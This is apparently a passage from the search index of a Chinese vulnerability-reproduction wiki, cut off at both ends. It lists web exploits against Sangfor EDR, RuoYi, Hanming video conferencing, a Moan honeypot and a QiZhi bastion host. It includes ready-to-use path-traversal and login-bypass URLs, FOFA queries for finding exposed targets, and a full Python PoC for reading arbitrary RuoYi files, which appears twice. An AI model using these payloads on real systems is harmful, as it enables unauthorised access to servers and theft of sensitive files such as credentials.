%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] EDR <= v3.2.19","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"https://xxx.xxx.xxx.xxx/ui/login.php?user=admin [!NOTE] \u6ce8\u610f\u6700\u540e\u7684admin\u9700\u8981\u4e3a\u5b58\u5728\u7684\u7528\u6237\u540d","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CNVD-2021-01931/","text":"\u82e5\u4f9d(RuoYi)\u7ba1\u7406\u7cfb\u7edf \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u82e5\u4f9d\u7ba1\u7406\u7cfb\u7edf\u662f\u57fa\u4e8eSpringBoot\u7684\u6743\u9650\u7ba1\u7406\u7cfb\u7edf,\u767b\u5f55\u540e\u53f0\u540e\u53ef\u4ee5\u8bfb\u53d6\u670d\u52a1\u5668\u4e0a\u7684\u4efb\u610f\u6587\u4ef6 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] RuoYi < v4.5.1 FOFA \u00b6 [!NOTE] app=\"\u82e5\u4f9d-\u7ba1\u7406\u7cfb\u7edf\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u540e\u53f0\u540e\u8bbf\u95ee Url https://xxx.xxx.xxx.xxx/common/download/resource?resource=/profile/../../../../etc/passwd \u8bbf\u95ee\u540e\u4f1a\u4e0b\u8f7d\u6587\u4ef6 /etc/passwd \u53ef\u4ee5\u4f7f\u7528Burp\u6293\u5305\u6539\u53d8 /etc/passwd \u4e3a\u5176\u4ed6\u6587\u4ef6\u8def\u5f84\u83b7\u53d6\u654f\u611f\u4fe1\u606f \u5728\u65b0\u7248\u672c\u7684\u4fee\u590d\u4e2d\u6dfb\u52a0\u4e86\u8fc7\u6ee4 \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] POC\u4f7f\u7528\u9700\u8981\u540e\u53f0\u7684Cookie,\u8bfb\u53d6\u7684\u6587\u4ef6\u8def\u5f84\u5e94\u4e3a\u6839\u8def\u5f84 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: RuoYi < v4.5.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCookie >>> JSESSIONID=xxxxxx \\033 [0m' ) print ( '+ \\033 [36mFile >>> /etc/passwd \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , Cookie ): vuln_url = target_url + \"/common/download/resource?resource=/profile/../../../../etc/passwd\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} //common/download/resource?resource=/profile/../../../../etc/passwd \\033 [0m\" . format ( target_url )) if \"root\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u8bfb\u53d6 /etc/passwd \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) while True : Filename = input ( \" \\033 [35mFile >>> \\033 [0m\" ) if Filename == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , Cookie , Filename ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , Cookie , Filename ): vuln_url = target_url + \"/common/download/resource?resource=/profile/../../../../ {} \" . format ( Filename ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Cookie = str ( input ( \" \\033 [35mCookie >>> \\033 [0m\" )) POC_1 ( target_url , Cookie )","title":"\u82e5\u4f9d\u7ba1\u7406\u7cfb\u7edf \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 CNVD-2021-01931"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CNVD-2021-01931/#\u82e5\u4f9druoyi\u7ba1\u7406\u7cfb\u7edf-\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":"","title":"\u82e5\u4f9d(RuoYi)\u7ba1\u7406\u7cfb\u7edf \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CNVD-2021-01931/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u82e5\u4f9d\u7ba1\u7406\u7cfb\u7edf\u662f\u57fa\u4e8eSpringBoot\u7684\u6743\u9650\u7ba1\u7406\u7cfb\u7edf,\u767b\u5f55\u540e\u53f0\u540e\u53ef\u4ee5\u8bfb\u53d6\u670d\u52a1\u5668\u4e0a\u7684\u4efb\u610f\u6587\u4ef6","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CNVD-2021-01931/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] RuoYi < v4.5.1","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CNVD-2021-01931/#fofa","text":"[!NOTE] app=\"\u82e5\u4f9d-\u7ba1\u7406\u7cfb\u7edf\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CNVD-2021-01931/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u540e\u53f0\u540e\u8bbf\u95ee Url https://xxx.xxx.xxx.xxx/common/download/resource?resource=/profile/../../../../etc/passwd \u8bbf\u95ee\u540e\u4f1a\u4e0b\u8f7d\u6587\u4ef6 /etc/passwd \u53ef\u4ee5\u4f7f\u7528Burp\u6293\u5305\u6539\u53d8 /etc/passwd \u4e3a\u5176\u4ed6\u6587\u4ef6\u8def\u5f84\u83b7\u53d6\u654f\u611f\u4fe1\u606f \u5728\u65b0\u7248\u672c\u7684\u4fee\u590d\u4e2d\u6dfb\u52a0\u4e86\u8fc7\u6ee4","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CNVD-2021-01931/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] POC\u4f7f\u7528\u9700\u8981\u540e\u53f0\u7684Cookie,\u8bfb\u53d6\u7684\u6587\u4ef6\u8def\u5f84\u5e94\u4e3a\u6839\u8def\u5f84 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: RuoYi < v4.5.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCookie >>> JSESSIONID=xxxxxx \\033 [0m' ) print ( '+ \\033 [36mFile >>> /etc/passwd \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , Cookie ): vuln_url = target_url + \"/common/download/resource?resource=/profile/../../../../etc/passwd\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 {} //common/download/resource?resource=/profile/../../../../etc/passwd \\033 [0m\" . format ( target_url )) if \"root\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u8bfb\u53d6 /etc/passwd \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) while True : Filename = input ( \" \\033 [35mFile >>> \\033 [0m\" ) if Filename == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , Cookie , Filename ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , Cookie , Filename ): vuln_url = target_url + \"/common/download/resource?resource=/profile/../../../../ {} \" . format ( Filename ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Cookie = str ( input ( \" \\033 [35mCookie >>> \\033 [0m\" )) POC_1 ( target_url , Cookie )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97%20%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62437/","text":"\u94f6\u6f8e\u4e91\u8ba1\u7b97 \u597d\u89c6\u901a\u89c6\u9891\u4f1a\u8bae\u7cfb\u7edf \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u94f6\u6f8e\u4e91\u8ba1\u7b97 \u597d\u89c6\u901a\u89c6\u9891\u4f1a\u8bae\u7cfb\u7edf \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u83b7\u53d6\u654f\u611f\u4fe1\u606f \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u94f6\u6f8e\u4e91\u8ba1\u7b97 \u597d\u89c6\u901a\u89c6\u9891\u4f1a\u8bae\u7cfb\u7edf FOFA \u00b6 [!NOTE] app=\"Hanming-Video-Conferencing\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b \u6f0f\u6d1eUrl\u4e3a https://xxx.xxx.xxx.xxx/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Yinpeng_Hanming_Video_Conferencing__Arbitrary_file_read.json","title":"\u94f6\u6f8e\u4e91\u8ba1\u7b97 \u597d\u89c6\u901a\u89c6\u9891\u4f1a\u8bae\u7cfb\u7edf \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d CNVD-2020-62437"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97%20%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62437/#\u94f6\u6f8e\u4e91\u8ba1\u7b97-\u597d\u89c6\u901a\u89c6\u9891\u4f1a\u8bae\u7cfb\u7edf-\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d","text":"","title":"\u94f6\u6f8e\u4e91\u8ba1\u7b97 \u597d\u89c6\u901a\u89c6\u9891\u4f1a\u8bae\u7cfb\u7edf \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97%20%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62437/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u94f6\u6f8e\u4e91\u8ba1\u7b97 \u597d\u89c6\u901a\u89c6\u9891\u4f1a\u8bae\u7cfb\u7edf \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u83b7\u53d6\u654f\u611f\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97%20%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62437/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u94f6\u6f8e\u4e91\u8ba1\u7b97 \u597d\u89c6\u901a\u89c6\u9891\u4f1a\u8bae\u7cfb\u7edf","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97%20%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62437/#fofa","text":"[!NOTE] app=\"Hanming-Video-Conferencing\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97%20%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62437/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b \u6f0f\u6d1eUrl\u4e3a https://xxx.xxx.xxx.xxx/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97%20%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20CNVD-2020-62437/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Yinpeng_Hanming_Video_Conferencing__Arbitrary_file_read.json","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BB%98%E5%AE%89/%E9%BB%98%E5%AE%89%20%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20RCE/","text":"\u9ed8\u5b89 \u5e7b\u9635\u871c\u7f50\u672a\u6388\u6743\u8bbf\u95ee RCE \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u9ed8\u5b89 \u5e7b\u9635\u871c\u7f50\u5b58\u5728\u90e8\u7f72\u9875\u9762\u672a\u6388\u6743\u8bbf\u95ee \uff0c\u53ef\u6267\u884c\u4efb\u610f\u547d\u4ee4 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u9ed8\u5b89 \u5e7b\u9635\u871c\u7f50 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4ea7\u54c1\u9875\u9762 \u5b89\u88c5\u9875\u9762\u5982\u4e0b \u9ed8\u5b89 \u5e7b\u9635\u871c\u7f50 \u5237\u65b0\u5e76\u6293\u5305 Drop\u6389 /huanzhen/have_installed? \u8fdb\u5165\u9875\u9762 \u70b9\u51fb\u8c03\u8bd5\u6293\u5305 \u6267\u884c\u5176\u4ed6\u547d\u4ee4 \u70b9\u51fb\u4e00\u952e\u8bca\u65ad\u6cc4\u9732 IP\u6570\u636e","title":"\u9ed8\u5b89 \u5e7b\u9635\u871c\u7f50\u672a\u6388\u6743\u8bbf\u95ee RCE"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BB%98%E5%AE%89/%E9%BB%98%E5%AE%89%20%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20RCE/#\u9ed8\u5b89-\u5e7b\u9635\u871c\u7f50\u672a\u6388\u6743\u8bbf\u95ee-rce","text":"","title":"\u9ed8\u5b89 \u5e7b\u9635\u871c\u7f50\u672a\u6388\u6743\u8bbf\u95ee RCE"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BB%98%E5%AE%89/%E9%BB%98%E5%AE%89%20%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20RCE/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u9ed8\u5b89 \u5e7b\u9635\u871c\u7f50\u5b58\u5728\u90e8\u7f72\u9875\u9762\u672a\u6388\u6743\u8bbf\u95ee \uff0c\u53ef\u6267\u884c\u4efb\u610f\u547d\u4ee4","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BB%98%E5%AE%89/%E9%BB%98%E5%AE%89%20%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20RCE/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u9ed8\u5b89 \u5e7b\u9635\u871c\u7f50","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BB%98%E5%AE%89/%E9%BB%98%E5%AE%89%20%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20RCE/#\u6f0f\u6d1e\u590d\u73b0","text":"\u4ea7\u54c1\u9875\u9762 \u5b89\u88c5\u9875\u9762\u5982\u4e0b \u9ed8\u5b89 \u5e7b\u9635\u871c\u7f50 \u5237\u65b0\u5e76\u6293\u5305 Drop\u6389 /huanzhen/have_installed? \u8fdb\u5165\u9875\u9762 \u70b9\u51fb\u8c03\u8bd5\u6293\u5305 \u6267\u884c\u5176\u4ed6\u547d\u4ee4 \u70b9\u51fb\u4e00\u952e\u8bca\u65ad\u6cc4\u9732 IP\u6570\u636e","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/","text":"\u9f50\u6cbb\u5821\u5792\u673a \u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u9f50\u6cbb\u5821\u5792\u673a \u5b58\u5728\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e\uff0c\u8bbf\u95ee\u7279\u5b9a\u7684Url\u5373\u53ef\u83b7\u5f97\u540e\u53f0\u6743\u9650 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u9f50\u6cbb\u5821\u5792\u673a FOFA \u00b6 [!NOTE] app=\"\u9f50\u6cbb\u79d1\u6280-\u5821\u5792\u673a\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1ePOC\u4e3a http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d shterm(QiZhi) Fortress Arbitrary User Login","title":"\u9f50\u6cbb\u5821\u5792\u673a \u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u9f50\u6cbb\u5821\u5792\u673a-\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e","text":"","title":"\u9f50\u6cbb\u5821\u5792\u673a 